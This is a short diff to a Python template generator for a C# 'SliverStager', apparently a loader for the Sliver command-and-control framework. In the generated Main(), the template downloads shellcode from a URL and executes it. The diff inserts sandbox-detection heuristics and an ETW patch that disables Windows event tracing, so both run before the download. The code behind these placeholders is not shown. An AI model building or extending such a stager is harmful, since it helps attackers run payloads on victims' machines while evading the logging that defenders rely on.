@@ -27,9 +27,13 @@ namespace SliverStager
     public class Stager
     {{
         {START_SHELLCODE_IMPORT}
+        {HEURISTICS_IMPORT}
         {ARCH_DETECTION}
+        {ETW_FUNCS}
         public static void Main()
         {{
+            {HEURISTICS_CODE}
+            {ETW_PATCH}
             {URL_DL_CODE}
             {START_SHELLCODE}
         }}
@@ -37,6 +41,10 @@ namespace SliverStager
     }}
 }}
   """.format(URL_DL_CODE=url_dl_code,
+             HEURISTICS_IMPORT=HEURISTICS_IMPORT,
+             ETW_FUNCS=ETW_FUNCS,
+             HEURISTICS_CODE=HEURISTICS_CODE,
+             ETW_PATCH=ETW_PATCH,
              ARCH_DETECTION=ARCH_DETECTION,
              START_SHELLCODE_IMPORT=START_SHELLCODE_IMPORT,
              START_SHELLCODE=START_SHELLCODE)
